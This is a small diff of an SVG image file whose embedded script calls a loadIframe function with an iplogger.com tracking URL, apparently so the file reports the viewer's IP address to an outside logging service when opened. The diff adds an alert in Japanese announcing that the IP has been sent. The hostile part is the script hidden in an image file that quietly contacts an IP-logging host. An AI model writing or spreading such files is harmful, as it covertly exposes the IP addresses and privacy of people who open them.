@@ -14,6 +14,6 @@ function loadIframe(url) {
 // 使用例
 const targetUrl = 'https://iplogger.com/25bde6';
 loadIframe(targetUrl);
-
+alert("ipが送信されました！！");
 </script>
 </svg>
